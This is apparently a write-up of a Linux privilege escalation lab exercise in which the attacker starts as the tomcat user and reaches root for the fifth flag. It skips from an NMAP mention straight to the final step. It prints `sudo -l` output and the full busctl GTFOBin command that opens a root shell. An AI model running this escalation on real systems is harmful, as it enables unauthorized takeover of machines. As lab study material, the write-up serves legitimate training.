Linux Privilege Escalation
Skills Assessment

Finding 5 flags across a Linux system by chaining credential leaks, a Tomcat WAR shell, and a sudo GTFOBin to reach root.

For this skills assessment we are provided with ssh access to the target machine. In total we have to find the 5 flags hidden in the system accessible with various privileges.

The usual NMAP scan can provide us with valuable information on possible escalation paths:

We still can't locate flag5, so we probably need to escalate our privileges to root. With sudo -l we find that we can run busctl.

Check sudo permissions
tomcat@nix03:/var/lib/tomcat9$ sudo -l
sudo -l
Matching Defaults entries for tomcat on nix03:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on nix03:
    (root) NOPASSWD: /usr/bin/busctl

busctl is a known GTFOBin, and this page: https://gtfobins.org/gtfobins/busctl/ provides us with a command that can be used to elevate our privileges to root. Just copying the command doesn't work immediately, we have to specify that we use the correct binary (/usr/bin/busctl) and that we include the sudo command as well.

Flag 5 — busctl GTFOBin to root
tomcat@nix03:/var/lib/tomcat9$ sudo /usr/bin/busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
